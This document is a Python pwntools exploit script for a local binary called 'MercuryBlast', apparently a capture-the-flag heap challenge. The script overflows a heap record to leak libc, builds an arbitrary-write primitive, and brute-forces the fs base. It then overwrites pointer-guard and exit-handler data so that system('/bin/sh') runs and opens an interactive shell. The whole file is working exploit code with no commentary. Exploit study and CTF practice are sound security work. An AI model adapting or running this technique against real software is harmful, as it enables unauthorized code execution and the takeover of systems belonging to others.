from pwn import * 
import random

binary = "./MercuryBlast"
#context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)
context.binary = binary

def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer):
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")

def exp(libc_base, fsbase):
    sys_addr = libc_base + libc.sym['system']

    fs_neg0x58 = fsbase - 0x58
    fs_0x30 = fsbase + 0x30
    controllable_addr = libc_base - 0x2aaaa26a8000 + 0x500

    bin_sh_addr = libc_base + 0x1d8698
    print("libc_base:", hex(libc_base))
    print("fsbase:", hex(fsbase))

    def arbitrary_write(addr, target):
        payload = flat(
            b"A" * 0x100,
            0,
            0x21,
            0x1,
            0x1000,
            addr
        )
        edit_record(1, 0x200, payload)
        edit_record(0, 0x200, target)

    arbitrary_write(fs_neg0x58, p64(controllable_addr))
    arbitrary_write(fs_0x30, p64(0x0))
    arbitrary_write(controllable_addr, p64(sys_addr << 0x11))
    arbitrary_write(controllable_addr + 0x8, p64(bin_sh_addr))

    payload = flat(
            b"A" * 0x100,
            0,
            0x21,
            0x1,
            0x1000,
            0
    )
    edit_record(1, 0x200, payload)
    p.sendlineafter("Your choice: ", "0")
    p.interactive()

while True:
    try:
        p = process(binary)
        p.settimeout(1)
        # Initial setup
        for i in range(8):
            add_record(0x100, b"a")
        add_record(0x100, b"a")
        for i in range(8):          
            delete_record(i)
        add_record(0x100, b"a")

        payload = flat(
            b"A" * 0x100,
            0,
            0x21,
            0x1,
            0x1000
        )
        add_record(0x100, b"b")

        edit_record(1, 0x200, payload)
        print_record()

        leak = p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')
        leak = u64(leak)
        libc_base = leak - 0x219ce0
        if libc_base & 0xfff != 0:
            print("[-] libc_base not page-aligned, retrying...")
            p.close()
            continue
        
            
        offset = random.randint(0x000, 0xfff)
        print(f"Trying offset 0x{offset:03x}")

        fsbase = libc_base + (offset << 12) | 0x740

        if fsbase & 0xfff != 0x740:
            print("[-] fsbase not ending with 740, retrying...")
            p.close()
            continue
        exp(libc_base, fsbase)
        
    except EOFError:
        p.close()
        continue
    except TimeoutError:
        p.close()
        continue
    except Exception as e:
        print(f"Error: {e}") 
        p.close()
        continue